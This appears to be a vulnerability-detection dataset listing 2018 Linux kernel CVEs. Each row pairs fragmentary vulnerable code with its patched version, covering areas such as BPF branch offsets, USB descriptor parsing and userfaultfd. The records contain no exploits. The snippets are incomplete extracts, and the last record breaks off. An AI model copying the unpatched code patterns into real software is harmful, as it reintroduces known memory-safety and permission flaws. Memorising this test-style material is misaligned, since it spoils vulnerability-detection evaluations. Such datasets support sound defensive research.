2018,DoS ,CVE-2018-1000004,,
2021,Overflow ,CVE-2018-25020," return 0;
}

static void bpf_adj_branches(struct bpf_prog *prog, u32 pos, u32 delta)

{



































 struct bpf_insn *insn = prog->insnsi;
	u32 i, insn_cnt = prog->len;
 bool pseudo_call;
	u8 code;
 int off;

 for (i = 0; i < insn_cnt; i++, insn++) {










		code = insn->code;
 if (BPF_CLASS(code) != BPF_JMP)
 continue;
 if (BPF_OP(code) == BPF_EXIT)
 continue;

 if (BPF_OP(code) == BPF_CALL) {
 if (insn->src_reg == BPF_PSEUDO_CALL)
				pseudo_call = true;
 else
 continue;


		} else {
			pseudo_call = false;

		}
		off = pseudo_call ? insn->imm : insn->off;

 /* Adjust offset of jmps if we cross boundaries. */
 if (i < pos && i + off + 1 > pos)
			off += delta;
 else if (i > pos + delta && i + off + 1 <= pos + delta)
			off -= delta;

 if (pseudo_call)
			insn->imm = off;
 else
			insn->off = off;
	}


}

struct bpf_prog *bpf_patch_insn_single(struct bpf_prog *prog, u32 off,
 const struct bpf_insn *patch, u32 len)
{
	u32 insn_adj_cnt, insn_rest, insn_delta = len - 1;

 struct bpf_prog *prog_adj;

 /* Since our patchlet doesn't expand the image, we're done. */

	insn_adj_cnt = prog->len + insn_delta;










 /* Several new instructions need to be inserted. Make room
	 * for them. Likely, there's no need for a new allocation as
	 * last page could have large enough tailroom.
 sizeof(*patch) * insn_rest);
 memcpy(prog_adj->insnsi + off, patch, sizeof(*patch) * len);

 bpf_adj_branches(prog_adj, off, insn_delta);





 return prog_adj;
}

#define BPF_EMIT_JMP							\
 do {								\



 if (target >= len || target < 0)			\
 goto err;					\
 insn->off = addrs ? addrs[target] - addrs[i] - 1 : 0;	\
 /* Adjust pc relative offset for 2nd or 3rd insn. */	\
		insn->off -= insn - tmp_insns;				\




	} while (0)

 case BPF_JMP | BPF_JA:
"," return 0;
}

static int bpf_adj_delta_to_imm(struct bpf_insn *insn, u32 pos, u32 delta,
				u32 curr, const bool probe_pass)
{
 const s64 imm_min = S32_MIN, imm_max = S32_MAX;
	s64 imm = insn->imm;

 if (curr < pos && curr + imm + 1 > pos)
		imm += delta;
 else if (curr > pos + delta && curr + imm + 1 <= pos + delta)
		imm -= delta;
 if (imm < imm_min || imm > imm_max)
 return -ERANGE;
 if (!probe_pass)
		insn->imm = imm;
 return 0;
}

static int bpf_adj_delta_to_off(struct bpf_insn *insn, u32 pos, u32 delta,
				u32 curr, const bool probe_pass)
{
 const s32 off_min = S16_MIN, off_max = S16_MAX;
	s32 off = insn->off;

 if (curr < pos && curr + off + 1 > pos)
		off += delta;
 else if (curr > pos + delta && curr + off + 1 <= pos + delta)
		off -= delta;
 if (off < off_min || off > off_max)
 return -ERANGE;
 if (!probe_pass)
		insn->off = off;
 return 0;
}

static int bpf_adj_branches(struct bpf_prog *prog, u32 pos, u32 delta,
 const bool probe_pass)
{
	u32 i, insn_cnt = prog->len + (probe_pass ? delta : 0);
 struct bpf_insn *insn = prog->insnsi;
 int ret = 0;




 for (i = 0; i < insn_cnt; i++, insn++) {
		u8 code;

 /* In the probing pass we still operate on the original,
		 * unpatched image in order to check overflows before we
		 * do any other adjustments. Therefore skip the patchlet.
 */
 if (probe_pass && i == pos) {
			i += delta + 1;
			insn++;
		}
		code = insn->code;
 if (BPF_CLASS(code) != BPF_JMP ||
 BPF_OP(code) == BPF_EXIT)

 continue;
 /* Adjust offset of jmps if we cross patch boundaries. */
 if (BPF_OP(code) == BPF_CALL) {
 if (insn->src_reg != BPF_PSEUDO_CALL)


 continue;
			ret = bpf_adj_delta_to_imm(insn, pos, delta, i,
						   probe_pass);
		} else {
			ret = bpf_adj_delta_to_off(insn, pos, delta, i,
						   probe_pass);
		}
 if (ret)
 break;










	}

 return ret;
}

struct bpf_prog *bpf_patch_insn_single(struct bpf_prog *prog, u32 off,
 const struct bpf_insn *patch, u32 len)
{
	u32 insn_adj_cnt, insn_rest, insn_delta = len - 1;
 const u32 cnt_max = S16_MAX;
 struct bpf_prog *prog_adj;

 /* Since our patchlet doesn't expand the image, we're done. */

	insn_adj_cnt = prog->len + insn_delta;

 /* Reject anything that would potentially let the insn->off
	 * target overflow when we have excessive program expansions.
	 * We need to probe here before we do any reallocation where
	 * we afterwards may not fail anymore.
 */
 if (insn_adj_cnt > cnt_max &&
 bpf_adj_branches(prog, off, insn_delta, true))
 return NULL;

 /* Several new instructions need to be inserted. Make room
	 * for them. Likely, there's no need for a new allocation as
	 * last page could have large enough tailroom.
 sizeof(*patch) * insn_rest);
 memcpy(prog_adj->insnsi + off, patch, sizeof(*patch) * len);

 /* We are guaranteed to not fail at this point, otherwise
	 * the ship has sailed to reverse to the original state. An
	 * overflow cannot happen at this point.
 */
 BUG_ON(bpf_adj_branches(prog_adj, off, insn_delta, false));

 return prog_adj;
}

#define BPF_EMIT_JMP							\
 do {								\
 const s32 off_min = S16_MIN, off_max = S16_MAX;		\
		s32 off;						\
									\
 if (target >= len || target < 0)			\
 goto err;					\
		off = addrs ? addrs[target] - addrs[i] - 1 : 0; 	\
 /* Adjust pc relative offset for 2nd or 3rd insn. */	\
		off -= insn - tmp_insns;				\
 /* Reject anything not fitting into insn->off. */	\
 if (off < off_min || off > off_max)			\
 goto err;					\
		insn->off = off;					\
	} while (0)

 case BPF_JMP | BPF_JA:
"
2021,,CVE-2018-25015,,
2019,,CVE-2018-21008,,
2019,,CVE-2018-20976,,
2019,DoS ,CVE-2018-20961," if (err) {
 ERROR(midi, ""%s: couldn't enqueue request: %d\n"",
				    midi->out_ep->name, err);
 free_ep_req(midi->out_ep, req);

 return err;
		}
	}
/* Frees a usb_request previously allocated by alloc_ep_req() */
static inline void free_ep_req(struct usb_ep *ep, struct usb_request *req)
{

 kfree(req->buf);

 usb_ep_free_request(ep, req);
}

"," if (err) {
 ERROR(midi, ""%s: couldn't enqueue request: %d\n"",
				    midi->out_ep->name, err);
 if (req->buf != NULL)
 free_ep_req(midi->out_ep, req);
 return err;
		}
	}
/* Frees a usb_request previously allocated by alloc_ep_req() */
static inline void free_ep_req(struct usb_ep *ep, struct usb_request *req)
{
 WARN_ON(req->buf == NULL);
 kfree(req->buf);
	req->buf = NULL;
 usb_ep_free_request(ep, req);
}

"
2019,,CVE-2018-20856,"		q->exit_rq_fn(q, q->fq->flush_rq);
out_free_flush_queue:
 blk_free_flush_queue(q->fq);

 return -ENOMEM;
}
EXPORT_SYMBOL(blk_init_allocated_queue);
","		q->exit_rq_fn(q, q->fq->flush_rq);
out_free_flush_queue:
 blk_free_flush_queue(q->fq);
	q->fq = NULL;
 return -ENOMEM;
}
EXPORT_SYMBOL(blk_init_allocated_queue);
"
2019,Overflow ,CVE-2018-20855," struct mlx5_ib_resources *devr = &dev->devr;
 int inlen = MLX5_ST_SZ_BYTES(create_qp_in);
 struct mlx5_core_dev *mdev = dev->mdev;
 struct mlx5_ib_create_qp_resp resp;
 struct mlx5_ib_cq *send_cq;
 struct mlx5_ib_cq *recv_cq;
 unsigned long flags;
"," struct mlx5_ib_resources *devr = &dev->devr;
 int inlen = MLX5_ST_SZ_BYTES(create_qp_in);
 struct mlx5_core_dev *mdev = dev->mdev;
 struct mlx5_ib_create_qp_resp resp = {};
 struct mlx5_ib_cq *send_cq;
 struct mlx5_ib_cq *recv_cq;
 unsigned long flags;
"
2019,,CVE-2018-20854,"	port = args->args[0];
	idx = args->args[1];

 for (i = 0; i <= SERDES_MAX; i++) {
 struct serdes_macro *macro = phy_get_drvdata(ctrl->phys[i]);

 if (idx != macro->idx)
 if (IS_ERR(ctrl->regs))
 return PTR_ERR(ctrl->regs);

 for (i = 0; i <= SERDES_MAX; i++) {
		ret = serdes_phy_create(ctrl, i, &ctrl->phys[i]);
 if (ret)
 return ret;
","	port = args->args[0];
	idx = args->args[1];

 for (i = 0; i < SERDES_MAX; i++) {
 struct serdes_macro *macro = phy_get_drvdata(ctrl->phys[i]);

 if (idx != macro->idx)
 if (IS_ERR(ctrl->regs))
 return PTR_ERR(ctrl->regs);

 for (i = 0; i < SERDES_MAX; i++) {
		ret = serdes_phy_create(ctrl, i, &ctrl->phys[i]);
 if (ret)
 return ret;
"
2019,,CVE-2018-20836," unsigned long flags;

 spin_lock_irqsave(&task->task_state_lock, flags);
 if (!(task->task_state_flags & SAS_TASK_STATE_DONE))
		task->task_state_flags |= SAS_TASK_STATE_ABORTED;


 spin_unlock_irqrestore(&task->task_state_lock, flags);

 complete(&task->slow_task->completion);
}

static void smp_task_done(struct sas_task *task)
{
 if (!del_timer(&task->slow_task->timer))
 return;
 complete(&task->slow_task->completion);
}

"," unsigned long flags;

 spin_lock_irqsave(&task->task_state_lock, flags);
 if (!(task->task_state_flags & SAS_TASK_STATE_DONE)) {
		task->task_state_flags |= SAS_TASK_STATE_ABORTED;
 complete(&task->slow_task->completion);
	}
 spin_unlock_irqrestore(&task->task_state_lock, flags);


}

static void smp_task_done(struct sas_task *task)
{
 del_timer(&task->slow_task->timer);

 complete(&task->slow_task->completion);
}

"
2019,DoS ,CVE-2018-20784,"	}
}

/* Iterate thr' all leaf cfs_rq's on a runqueue */
#define for_each_leaf_cfs_rq_safe(rq, cfs_rq, pos)			\
 list_for_each_entry_safe(cfs_rq, pos, &rq->leaf_cfs_rq_list,	\
				 leaf_cfs_rq_list)

/* Do the two (enqueued) entities belong to the same group ? */
static inline struct cfs_rq *
{
}

#define for_each_leaf_cfs_rq_safe(rq, cfs_rq, pos)	\
 for (cfs_rq = &rq->cfs, pos = NULL; cfs_rq; cfs_rq = pos)

static inline struct sched_entity *parent_entity(struct sched_entity *se)
{

#ifdef CONFIG_FAIR_GROUP_SCHED

static inline bool cfs_rq_is_decayed(struct cfs_rq *cfs_rq)
{
 if (cfs_rq->load.weight)
 return false;

 if (cfs_rq->avg.load_sum)
 return false;

 if (cfs_rq->avg.util_sum)
 return false;

 if (cfs_rq->avg.runnable_load_sum)
 return false;

 return true;
}

static void update_blocked_averages(int cpu)
{
 struct rq *rq = cpu_rq(cpu);
 struct cfs_rq *cfs_rq, *pos;
 const struct sched_class *curr_class;
 struct rq_flags rf;
 bool done = true;
	 * Iterates the task_group tree in a bottom up fashion, see
	 * list_add_leaf_cfs_rq() for details.
 */
 for_each_leaf_cfs_rq_safe(rq, cfs_rq, pos) {
 struct sched_entity *se;

 /* throttled entities do not contribute to load */
 if (se && !skip_blocked_update(se))
 update_load_avg(cfs_rq_of(se), se, 0);

 /*
		 * There can be a lot of idle CPU cgroups.  Don't let fully
		 * decayed cfs_rqs linger on the list.
 */
 if (cfs_rq_is_decayed(cfs_rq))
 list_del_leaf_cfs_rq(cfs_rq);

 /* Don't need periodic decay once load/util_avg are null */
 if (cfs_rq_has_blocked(cfs_rq))
			done = false;
#ifdef CONFIG_SCHED_DEBUG
void print_cfs_stats(struct seq_file *m, int cpu)
{
 struct cfs_rq *cfs_rq, *pos;

 rcu_read_lock();
 for_each_leaf_cfs_rq_safe(cpu_rq(cpu), cfs_rq, pos)
 print_cfs_rq(m, cpu, cfs_rq);
 rcu_read_unlock();
}
","	}
}

/* Iterate through all leaf cfs_rq's on a runqueue: */
#define for_each_leaf_cfs_rq(rq, cfs_rq) \
 list_for_each_entry_rcu(cfs_rq, &rq->leaf_cfs_rq_list, leaf_cfs_rq_list)


/* Do the two (enqueued) entities belong to the same group ? */
static inline struct cfs_rq *
{
}

#define for_each_leaf_cfs_rq(rq, cfs_rq)	\
 for (cfs_rq = &rq->cfs; cfs_rq; cfs_rq = NULL)

static inline struct sched_entity *parent_entity(struct sched_entity *se)
{

#ifdef CONFIG_FAIR_GROUP_SCHED


















static void update_blocked_averages(int cpu)
{
 struct rq *rq = cpu_rq(cpu);
 struct cfs_rq *cfs_rq;
 const struct sched_class *curr_class;
 struct rq_flags rf;
 bool done = true;
	 * Iterates the task_group tree in a bottom up fashion, see
	 * list_add_leaf_cfs_rq() for details.
 */
 for_each_leaf_cfs_rq(rq, cfs_rq) {
 struct sched_entity *se;

 /* throttled entities do not contribute to load */
 if (se && !skip_blocked_update(se))
 update_load_avg(cfs_rq_of(se), se, 0);








 /* Don't need periodic decay once load/util_avg are null */
 if (cfs_rq_has_blocked(cfs_rq))
			done = false;
#ifdef CONFIG_SCHED_DEBUG
void print_cfs_stats(struct seq_file *m, int cpu)
{
 struct cfs_rq *cfs_rq;

 rcu_read_lock();
 for_each_leaf_cfs_rq(cpu_rq(cpu), cfs_rq)
 print_cfs_rq(m, cpu, cfs_rq);
 rcu_read_unlock();
}
"
2019,DoS ,CVE-2018-20669,,
2018,#NAME?,CVE-2018-20511," case SIOCFINDIPDDPRT:
 spin_lock_bh(&ipddp_route_lock);
			rp = __ipddp_find_route(&rcp);
 if (rp)
 memcpy(&rcp2, rp, sizeof(rcp2));




 spin_unlock_bh(&ipddp_route_lock);

 if (rp) {
"," case SIOCFINDIPDDPRT:
 spin_lock_bh(&ipddp_route_lock);
			rp = __ipddp_find_route(&rcp);
 if (rp) {
 memset(&rcp2, 0, sizeof(rcp2));
				rcp2.ip    = rp->ip;
				rcp2.at    = rp->at;
				rcp2.flags = rp->flags;
			}
 spin_unlock_bh(&ipddp_route_lock);

 if (rp) {
"
2019,#NAME?,CVE-2018-20510,,
2019,#NAME?,CVE-2018-20509,,
2019,#NAME?,CVE-2018-20449,,
2018,,CVE-2018-20169," /* descriptor may appear anywhere in config */
		err = __usb_get_extra_descriptor(udev->rawdescriptors[0],
 le16_to_cpu(udev->config[0].desc.wTotalLength),
				USB_DT_OTG, (void **) &desc);
 if (err || !(desc->bmAttributes & USB_OTG_HNP))
 return 0;

 */

int __usb_get_extra_descriptor(char *buffer, unsigned size,
 unsigned char type, void **ptr)
{
 struct usb_descriptor_header *header;

 while (size >= sizeof(struct usb_descriptor_header)) {
		header = (struct usb_descriptor_header *)buffer;

 if (header->bLength < 2) {
 printk(KERN_ERR
 ""%s: bogus descriptor, type %d length %d\n"",
				usbcore_name,
 return -1;
		}

 if (header->bDescriptorType == type) {
			*ptr = header;
 return 0;
		}
	top = itr + itr_size;
	result = __usb_get_extra_descriptor(usb_dev->rawdescriptors[index],
 le16_to_cpu(usb_dev->actconfig->desc.wTotalLength),
			USB_DT_SECURITY, (void **) &secd);
 if (result == -1) {
 dev_warn(dev, ""BUG? WUSB host has no security descriptors\n"");
 return 0;
};

int __usb_get_extra_descriptor(char *buffer, unsigned size,
 unsigned char type, void **ptr);
#define usb_get_extra_descriptor(ifpoint, type, ptr) \
 __usb_get_extra_descriptor((ifpoint)->extra, \
				(ifpoint)->extralen, \
				type, (void **)ptr)

/* ----------------------------------------------------------------------- */

"," /* descriptor may appear anywhere in config */
		err = __usb_get_extra_descriptor(udev->rawdescriptors[0],
 le16_to_cpu(udev->config[0].desc.wTotalLength),
				USB_DT_OTG, (void **) &desc, sizeof(*desc));
 if (err || !(desc->bmAttributes & USB_OTG_HNP))
 return 0;

 */

int __usb_get_extra_descriptor(char *buffer, unsigned size,
 unsigned char type, void **ptr, size_t minsize)
{
 struct usb_descriptor_header *header;

 while (size >= sizeof(struct usb_descriptor_header)) {
		header = (struct usb_descriptor_header *)buffer;

 if (header->bLength < 2 || header->bLength > size) {
 printk(KERN_ERR
 ""%s: bogus descriptor, type %d length %d\n"",
				usbcore_name,
 return -1;
		}

 if (header->bDescriptorType == type && header->bLength >= minsize) {
			*ptr = header;
 return 0;
		}
	top = itr + itr_size;
	result = __usb_get_extra_descriptor(usb_dev->rawdescriptors[index],
 le16_to_cpu(usb_dev->actconfig->desc.wTotalLength),
			USB_DT_SECURITY, (void **) &secd, sizeof(*secd));
 if (result == -1) {
 dev_warn(dev, ""BUG? WUSB host has no security descriptors\n"");
 return 0;
};

int __usb_get_extra_descriptor(char *buffer, unsigned size,
 unsigned char type, void **ptr, size_t min);
#define usb_get_extra_descriptor(ifpoint, type, ptr) \
 __usb_get_extra_descriptor((ifpoint)->extra, \
				(ifpoint)->extralen, \
				type, (void **)ptr, sizeof(**(ptr)))

/* ----------------------------------------------------------------------- */

"
2019,,CVE-2018-19985,,
2018,#NAME?,CVE-2018-19854,"{
 struct crypto_report_cipher rcipher;

 strlcpy(rcipher.type, ""cipher"", sizeof(rcipher.type));

	rcipher.blocksize = alg->cra_blocksize;
	rcipher.min_keysize = alg->cra_cipher.cia_min_keysize;
{
 struct crypto_report_comp rcomp;

 strlcpy(rcomp.type, ""compression"", sizeof(rcomp.type));
 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rcomp))
 goto nla_put_failure;
{
 struct crypto_report_acomp racomp;

 strlcpy(racomp.type, ""acomp"", sizeof(racomp.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_ACOMP,
 sizeof(struct crypto_report_acomp), &racomp))
{
 struct crypto_report_akcipher rakcipher;

 strlcpy(rakcipher.type, ""akcipher"", sizeof(rakcipher.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_AKCIPHER,
 sizeof(struct crypto_report_akcipher), &rakcipher))
{
 struct crypto_report_kpp rkpp;

 strlcpy(rkpp.type, ""kpp"", sizeof(rkpp.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_KPP,
 sizeof(struct crypto_report_kpp), &rkpp))
static int crypto_report_one(struct crypto_alg *alg,
 struct crypto_user_alg *ualg, struct sk_buff *skb)
{
 strlcpy(ualg->cru_name, alg->cra_name, sizeof(ualg->cru_name));
 strlcpy(ualg->cru_driver_name, alg->cra_driver_name,
 sizeof(ualg->cru_driver_name));
 strlcpy(ualg->cru_module_name, module_name(alg->cra_module),
 sizeof(ualg->cru_module_name));

	ualg->cru_type = 0;
 if (alg->cra_flags & CRYPTO_ALG_LARVAL) {
 struct crypto_report_larval rl;

 strlcpy(rl.type, ""larval"", sizeof(rl.type));
 if (nla_put(skb, CRYPTOCFGA_REPORT_LARVAL,
 sizeof(struct crypto_report_larval), &rl))
 goto nla_put_failure;
","{
 struct crypto_report_cipher rcipher;

 strncpy(rcipher.type, ""cipher"", sizeof(rcipher.type));

	rcipher.blocksize = alg->cra_blocksize;
	rcipher.min_keysize = alg->cra_cipher.cia_min_keysize;
{
 struct crypto_report_comp rcomp;

 strncpy(rcomp.type, ""compression"", sizeof(rcomp.type));
 if (nla_put(skb, CRYPTOCFGA_REPORT_COMPRESS,
 sizeof(struct crypto_report_comp), &rcomp))
 goto nla_put_failure;
{
 struct crypto_report_acomp racomp;

 strncpy(racomp.type, ""acomp"", sizeof(racomp.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_ACOMP,
 sizeof(struct crypto_report_acomp), &racomp))
{
 struct crypto_report_akcipher rakcipher;

 strncpy(rakcipher.type, ""akcipher"", sizeof(rakcipher.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_AKCIPHER,
 sizeof(struct crypto_report_akcipher), &rakcipher))
{
 struct crypto_report_kpp rkpp;

 strncpy(rkpp.type, ""kpp"", sizeof(rkpp.type));

 if (nla_put(skb, CRYPTOCFGA_REPORT_KPP,
 sizeof(struct crypto_report_kpp), &rkpp))
static int crypto_report_one(struct crypto_alg *alg,
 struct crypto_user_alg *ualg, struct sk_buff *skb)
{
 strncpy(ualg->cru_name, alg->cra_name, sizeof(ualg->cru_name));
 strncpy(ualg->cru_driver_name, alg->cra_driver_name,
 sizeof(ualg->cru_driver_name));
 strncpy(ualg->cru_module_name, module_name(alg->cra_module),
 sizeof(ualg->cru_module_name));

	ualg->cru_type = 0;
 if (alg->cra_flags & CRYPTO_ALG_LARVAL) {
 struct crypto_report_larval rl;

 strncpy(rl.type, ""larval"", sizeof(rl.type));
 if (nla_put(skb, CRYPTOCFGA_REPORT_LARVAL,
 sizeof(struct crypto_report_larval), &rl))
 goto nla_put_failure;
"
2018,,CVE-2018-19824,"
 __error:
 if (chip) {




 if (!chip->num_interfaces)
 snd_card_free(chip->card);
 atomic_dec(&chip->active);
	}
 mutex_unlock(&register_mutex);
 return err;
","
 __error:
 if (chip) {
 /* chip->active is inside the chip->card object,
		 * decrement before memory is possibly returned.
 */
 atomic_dec(&chip->active);
 if (!chip->num_interfaces)
 snd_card_free(chip->card);

	}
 mutex_unlock(&register_mutex);
 return err;
"
2018,DoS ,CVE-2018-19407,,
2018,DoS ,CVE-2018-19406,,
2018,Bypass ,CVE-2018-18955," if (!new_idmap_permitted(file, ns, cap_setid, &new_map))
 goto out;

	ret = sort_idmaps(&new_map);
 if (ret < 0)
 goto out;

	ret = -EPERM;
 /* Map the lower ids from the parent user namespace to the
	 * kernel global id space.
		e->lower_first = lower_first;
	}









 /* Install the map */
 if (new_map.nr_extents <= UID_GID_MAP_MAX_BASE_EXTENTS) {
 memcpy(map->extent, new_map.extent,
"," if (!new_idmap_permitted(file, ns, cap_setid, &new_map))
 goto out;





	ret = -EPERM;
 /* Map the lower ids from the parent user namespace to the
	 * kernel global id space.
		e->lower_first = lower_first;
	}

 /*
	 * If we want to use binary search for lookup, this clones the extent
	 * array and sorts both copies.
 */
	ret = sort_idmaps(&new_map);
 if (ret < 0)
 goto out;

 /* Install the map */
 if (new_map.nr_extents <= UID_GID_MAP_MAX_BASE_EXTENTS) {
 memcpy(map->extent, new_map.extent,
"
2018,#NAME?,CVE-2018-18710," return -ENOSYS;

 if (arg != CDSL_CURRENT && arg != CDSL_NONE) {
 if ((int)arg >= cdi->capacity)
 return -EINVAL;
	}

"," return -ENOSYS;

 if (arg != CDSL_CURRENT && arg != CDSL_NONE) {
 if (arg >= cdi->capacity)
 return -EINVAL;
	}

"
2018,,CVE-2018-18690," if (args->flags & ATTR_CREATE)
 return retval;
		retval = xfs_attr_shortform_remove(args);
 ASSERT(retval == 0);







	}

 if (args->namelen >= XFS_ATTR_SF_ENTSIZE_MAX ||
"," if (args->flags & ATTR_CREATE)
 return retval;
		retval = xfs_attr_shortform_remove(args);
 if (retval)
 return retval;
 /*
		 * Since we have removed the old attr, clear ATTR_REPLACE so
		 * that the leaf format add routine won't trip over the attr
		 * not being around.
 */
		args->flags &= ~ATTR_REPLACE;
	}

 if (args->namelen >= XFS_ATTR_SF_ENTSIZE_MAX ||
"
2018,,CVE-2018-18559,,
2018,,CVE-2018-18445,"	u64 umin_val, umax_val;
	u64 insn_bitness = (BPF_CLASS(insn->code) == BPF_ALU64) ? 64 : 32;










	smin_val = src_reg.smin_value;
	smax_val = src_reg.smax_value;
	umin_val = src_reg.umin_value;
 if (BPF_CLASS(insn->code) != BPF_ALU64) {
 /* 32-bit ALU ops are (32,32)->32 */
 coerce_reg_to_size(dst_reg, 4);
 coerce_reg_to_size(&src_reg, 4);
	}

 __reg_deduce_bounds(dst_reg);
","	u64 umin_val, umax_val;
	u64 insn_bitness = (BPF_CLASS(insn->code) == BPF_ALU64) ? 64 : 32;

 if (insn_bitness == 32) {
 /* Relevant for 32-bit RSH: Information can propagate towards
		 * LSB, so it isn't sufficient to only truncate the output to
		 * 32 bits.
 */
 coerce_reg_to_size(dst_reg, 4);
 coerce_reg_to_size(&src_reg, 4);
	}

	smin_val = src_reg.smin_value;
	smax_val = src_reg.smax_value;
	umin_val = src_reg.umin_value;
 if (BPF_CLASS(insn->code) != BPF_ALU64) {
 /* 32-bit ALU ops are (32,32)->32 */
 coerce_reg_to_size(dst_reg, 4);

	}

 __reg_deduce_bounds(dst_reg);
"
2018,,CVE-2018-18397,"		ret = -EINVAL;
 if (!vma_can_userfault(cur))
 goto out_unlock;













 /*
		 * If this vma contains ending address, and huge pages
		 * check alignment.
 BUG_ON(!vma_can_userfault(vma));
 BUG_ON(vma->vm_userfaultfd_ctx.ctx &&
		       vma->vm_userfaultfd_ctx.ctx != ctx);


 /*
		 * Nothing to do: this vma is already registered into this
 cond_resched();

 BUG_ON(!vma_can_userfault(vma));


 /*
		 * Nothing to do: this vma is already registered into this
 if (!dst_vma || !is_vm_hugetlb_page(dst_vma))
 goto out_unlock;
 /*
		 * Only allow __mcopy_atomic_hugetlb on userfaultfd
		 * registered ranges.

 */
 if (!dst_vma->vm_userfaultfd_ctx.ctx)
 goto out_unlock;
 if (!dst_vma)
 goto out_unlock;
 /*
	 * Be strict and only allow __mcopy_atomic on userfaultfd
	 * registered ranges to prevent userland errors going
	 * unnoticed. As far as the VM consistency is concerned, it
	 * would be perfectly safe to remove this check, but there's
	 * no useful usage for __mcopy_atomic ouside of userfaultfd
	 * registered ranges. This is after all why these are ioctls
	 * belonging to the userfaultfd and not syscalls.
 */
 if (!dst_vma->vm_userfaultfd_ctx.ctx)
 goto out_unlock;
","		ret = -EINVAL;
 if (!vma_can_userfault(cur))
 goto out_unlock;

 /*
		 * UFFDIO_COPY will fill file holes even without
		 * PROT_WRITE. This check enforces that if this is a
		 * MAP_SHARED, the process has write permission to the backing
		 * file. If VM_MAYWRITE is set it also enforces that on a
		 * MAP_SHARED vma: there is no F_WRITE_SEAL and no further
		 * F_WRITE_SEAL can be taken until the vma is destroyed.
 */
		ret = -EPERM;
 if (unlikely(!(cur->vm_flags & VM_MAYWRITE)))
 goto out_unlock;

 /*
		 * If this vma contains ending address, and huge pages
		 * check alignment.
 BUG_ON(!vma_can_userfault(vma));
 BUG_ON(vma->vm_userfaultfd_ctx.ctx &&
		       vma->vm_userfaultfd_ctx.ctx != ctx);
 WARN_ON(!(vma->vm_flags & VM_MAYWRITE));

 /*
		 * Nothing to do: this vma is already registered into this
 cond_resched();

 BUG_ON(!vma_can_userfault(vma));
 WARN_ON(!(vma->vm_flags & VM_MAYWRITE));

 /*
		 * Nothing to do: this vma is already registered into this
 if (!dst_vma || !is_vm_hugetlb_page(dst_vma))
 goto out_unlock;
 /*
		 * Check the vma is registered in uffd, this is
		 * required to enforce the VM_MAYWRITE check done at
		 * uffd registration time.
 */
 if (!dst_vma->vm_userfaultfd_ctx.ctx)
 goto out_unlock;
 if (!dst_vma)
 goto out_unlock;
 /*
	 * Check the vma is registered in uffd, this is required to
	 * enforce the VM_MAYWRITE check done at uffd registration
	 * time.




 */
 if (!dst_vma->vm_userfaultfd_ctx.ctx)
 goto out_unlock;
"
2018,,CVE-2018-18386,"{
 struct n_tty_data *ldata = tty->disc_data;

 if (!old || (old->c_lflag ^ tty->termios.c_lflag) & ICANON) {
 bitmap_zero(ldata->read_flags, N_TTY_BUF_SIZE);
		ldata->line_start = ldata->read_tail;
 if (!L_ICANON(tty) || !read_cnt(ldata)) {
 return put_user(tty_chars_in_buffer(tty), (int __user *) arg);
 case TIOCINQ:
 down_write(&tty->termios_rwsem);
 if (L_ICANON(tty))
			retval = inq_canon(ldata);
 else
			retval = read_cnt(ldata);
","{
 struct n_tty_data *ldata = tty->disc_data;

 if (!old || (old->c_lflag ^ tty->termios.c_lflag) & (ICANON | EXTPROC)) {
 bitmap_zero(ldata->read_flags, N_TTY_BUF_SIZE);
		ldata->line_start = ldata->read_tail;
 if (!L_ICANON(tty) || !read_cnt(ldata)) {
 return put_user(tty_chars_in_buffer(tty), (int __user *) arg);
 case TIOCINQ:
 down_write(&tty->termios_rwsem);
 if (L_ICANON(tty) && !L_EXTPROC(tty))
			retval = inq_canon(ldata);
 else
			retval = read_cnt(ldata);
"
2018,,CVE-2018-18281,,
2018,DoS ,CVE-2018-18021,"	}

 if (off == KVM_REG_ARM_CORE_REG(regs.pstate)) {
 u32 mode = (*(u32 *)valp) & PSR_AA32_MODE_MASK;
 switch (mode) {
 case PSR_AA32_MODE_USR:



 case PSR_AA32_MODE_FIQ:
 case PSR_AA32_MODE_IRQ:
 case PSR_AA32_MODE_SVC:
 case PSR_AA32_MODE_ABT:
 case PSR_AA32_MODE_UND:



 case PSR_MODE_EL0t:
 case PSR_MODE_EL1t:
 case PSR_MODE_EL1h:


 break;
 default:
			err = -EINVAL;
","	}

 if (off == KVM_REG_ARM_CORE_REG(regs.pstate)) {
 u64 mode = (*(u64 *)valp) & PSR_AA32_MODE_MASK;
 switch (mode) {
 case PSR_AA32_MODE_USR:
 if (!system_supports_32bit_el0())
 return -EINVAL;
 break;
 case PSR_AA32_MODE_FIQ:
 case PSR_AA32_MODE_IRQ:
 case PSR_AA32_MODE_SVC:
 case PSR_AA32_MODE_ABT:
 case PSR_AA32_MODE_UND:
 if (!vcpu_el1_is_32bit(vcpu))
 return -EINVAL;
 break;
 case PSR_MODE_EL0t:
 case PSR_MODE_EL1t:
 case PSR_MODE_EL1h:
 if (vcpu_el1_is_32bit(vcpu))
 return -EINVAL;
 break;
 default:
			err = -EINVAL;
"
2018,DoS ,CVE-2018-17977,,
2018,,CVE-2018-17972,,
2018,Overflow +Priv ,CVE-2018-17182," struct {
 struct vm_area_struct *mmap;		/* list of VMAs */
 struct rb_root mm_rb;
 u32 vmacache_seqnum;                   /* per-thread vmacache */
#ifdef CONFIG_MMU
 unsigned long (*get_unmapped_area) (struct file *filp,
 unsigned long addr, unsigned long len,
#define VMACACHE_MASK (VMACACHE_SIZE - 1)

struct vmacache {
 u32 seqnum;
 struct vm_area_struct *vmas[VMACACHE_SIZE];
};

#ifdef CONFIG_DEBUG_VM_VMACACHE
		VMACACHE_FIND_CALLS,
		VMACACHE_FIND_HITS,
		VMACACHE_FULL_FLUSHES,
#endif
#ifdef CONFIG_SWAP
		SWAP_RA,
 memset(tsk->vmacache.vmas, 0, sizeof(tsk->vmacache.vmas));
}

extern void vmacache_flush_all(struct mm_struct *mm);
extern void vmacache_update(unsigned long addr, struct vm_area_struct *newvma);
extern struct vm_area_struct *vmacache_find(struct mm_struct *mm,
 unsigned long addr);
static inline void vmacache_invalidate(struct mm_struct *mm)
{
	mm->vmacache_seqnum++;

 /* deal with overflows */
 if (unlikely(mm->vmacache_seqnum == 0))
 vmacache_flush_all(mm);
}

#endif /* __LINUX_VMACACHE_H */

void dump_mm(const struct mm_struct *mm)
{
